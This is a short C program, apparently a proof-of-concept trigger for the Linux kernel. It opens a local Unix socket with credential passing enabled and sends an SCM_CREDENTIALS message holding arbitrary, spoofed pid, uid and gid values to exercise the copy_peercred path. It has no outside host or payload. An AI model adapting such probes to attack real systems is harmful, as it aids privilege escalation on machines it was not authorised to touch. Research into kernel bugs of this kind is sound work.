#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#ifndef SCM_CREDENTIALS
#define SCM_CREDENTIALS 0x02
#endif

int main(void)
{
    int ret, fd_listen, fd_client, fd_accepted;
    struct sockaddr_un addr;
    
    unlink("/tmp/poc.sock");
    
    fd_listen = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd_listen < 0) { perror("socket"); return 1; }
    
    int optval = 1;
    ret = setsockopt(fd_listen, SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));
    if (ret < 0) { perror("setsockopt"); }
    
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, "/tmp/poc.sock", sizeof(addr.sun_path) - 1);
    
    ret = bind(fd_listen, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("bind"); return 1; }
    
    ret = listen(fd_listen, 8);
    if (ret < 0) { perror("listen"); return 1; }
    
    fd_client = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd_client < 0) { perror("client socket"); return 1; }
    
    ret = setsockopt(fd_client, SOL_SOCKET, SO_PASSCRED, &optval, sizeof(optval));
    if (ret < 0) { perror("setsockopt client"); }
    
    ret = connect(fd_client, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("connect"); return 1; }
    
    fd_accepted = accept(fd_listen, NULL, NULL);
    if (fd_accepted < 0) { perror("accept"); return 1; }
    
    printf("[+] Connected - copy_peercred called\n");
    
    /* Send SCM_CREDENTIALS */
    struct msghdr msg;
    struct iovec iov;
    char data[] = "test";
    char cmsg_buf[128];
    
    memset(&msg, 0, sizeof(msg));
    
    unsigned int creds[3] = {9999, 12345, 67890};
    
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_CREDENTIALS;
    cmsg->cmsg_len = CMSG_LEN(12);
    memcpy(CMSG_DATA(cmsg), creds, 12);
    
    iov.iov_base = data;
    iov.iov_len = 5;
    
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg;
    msg.msg_controllen = CMSG_SPACE(12);
    
    ret = sendmsg(fd_client, &msg, 0);
    if (ret < 0) { perror("sendmsg"); return 1; }
    printf("[+] Sent SCM_CREDENTIALS\n");
    
    char rbuf[64];
    ret = recv(fd_accepted, rbuf, sizeof(rbuf), 0);
    if (ret < 0) { perror("recv"); }
    else { printf("[+] Received %d bytes\n", ret); }
    
    close(fd_accepted);
    close(fd_client);
    close(fd_listen);
    unlink("/tmp/poc.sock");
    
    return 0;
}
